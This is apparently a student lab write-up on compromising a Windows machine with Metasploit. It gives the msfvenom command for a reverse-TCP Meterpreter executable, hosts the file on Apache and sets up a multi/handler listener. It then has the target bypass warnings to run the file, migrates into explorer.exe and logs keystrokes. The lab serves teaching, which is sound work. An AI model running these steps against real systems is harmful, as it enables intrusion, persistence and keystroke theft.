# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="1280" height="687" alt="3 1" src="https://github.com/user-attachments/assets/657d090d-f7d0-4f11-852f-847553ed2f5a" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="1040" height="378" alt="3 2" src="https://github.com/user-attachments/assets/e619e668-a1b6-4867-b22c-8fda9645d44c" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="1086" height="362" alt="3 3" src="https://github.com/user-attachments/assets/981aaada-ffad-4857-b6d4-b41f55eec693" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="1040" height="378" alt="3 4" src="https://github.com/user-attachments/assets/313c722c-b7c6-4a74-acd6-e593f39564ce" />


Check the status of apache2
## OUTPUT:

<img width="1280" height="693" alt="3 5" src="https://github.com/user-attachments/assets/ccaa5ea4-e374-4ed5-ae45-a6db0ad84439" />


Invoke msfconsole:
## OUTPUT:

<img width="1280" height="628" alt="3 6" src="https://github.com/user-attachments/assets/c2af65f9-626c-44c3-89c6-0b3a6511aecd" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="911" height="487" alt="image" src="https://github.com/user-attachments/assets/c0841a81-a93a-4e98-b645-53ecbb0d0414" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="915" height="280" alt="image" src="https://github.com/user-attachments/assets/d0f789d0-3282-4aac-9b77-73f67a7f76e5" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="762" height="395" alt="image" src="https://github.com/user-attachments/assets/c77e33ac-42ca-4aa0-86fa-34a9c6df2e9b" />



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="762" height="395" alt="image" src="https://github.com/user-attachments/assets/70b7e8bd-6bf7-42a5-a68d-9d53ac6af7c9" />



On kali/parrot give the command exploit
## OUTPUT:

<img width="737" height="73" alt="image" src="https://github.com/user-attachments/assets/d54b2708-b300-42a0-823a-52a7e5c25e2e" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="738" height="177" alt="image" src="https://github.com/user-attachments/assets/eb5d8167-6467-48bb-b1b4-cea9ff03c184" />



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="901" height="436" alt="image" src="https://github.com/user-attachments/assets/5453f235-97e7-4171-9d8b-7992ac28b1cc" />



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:

<img width="557" height="70" alt="image" src="https://github.com/user-attachments/assets/1c642bb3-ce02-465b-a3c1-f330d11b63d7" />



keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="820" height="103" alt="image" src="https://github.com/user-attachments/assets/74039248-b990-42b3-96db-36c703e9c5ec" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
